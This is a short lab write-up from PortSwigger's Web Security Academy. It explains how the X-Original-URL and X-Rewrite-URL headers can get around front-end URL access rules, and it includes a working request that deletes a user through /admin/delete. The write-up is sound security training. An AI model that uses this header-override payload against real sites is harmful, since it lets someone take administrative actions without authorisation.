# URL-based access control can be circumvented

[Lab in PortSwigger](https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented)

## Definition
 Some applications enforce access controls at the platform layer by restricting access to specific URLs and HTTP methods based on the user's role. For example an application might configure rules like the following:
``` 
DENY: POST, /admin/deleteUser, managers
```

This rule denies access to the POST method on the URL `/admin/deleteUser`, for users in the managers group. Various things can go wrong in this situation, leading to access control bypasses.

Some application frameworks support various non-standard HTTP headers that can be used to override the URL in the original request, such as `X-Original-URL` and `X-Rewrite-URL`. If a web site uses rigorous front-end controls to restrict access based on URL, but the application allows the URL to be overridden via a request header, then it might be possible to bypass the access controls using a request like the following:
```
POST / HTTP/1.1
X-Original-URL: /admin/deleteUser
...
```

## Notes
Request to delete a user:
```http
POST /admin/delete?username=<username>
```

The front-end restricts this request to the administrator user. But using the header `X-Original-URL` it's possible to bypass this rule.

```http
GET /?username=carlos HTTP/1.1
Host: acf11f6e1fa1057ec015425d00a40014.web-security-academy.net
Cookie: session=kGyfrOxh3yGg9BEQ93cdVJ4txNKnZSbh
X-Original-Url: /admin/delete
...
```

## Key Words
> header, x-original-url, x-rewrite-url, waf, api-gateway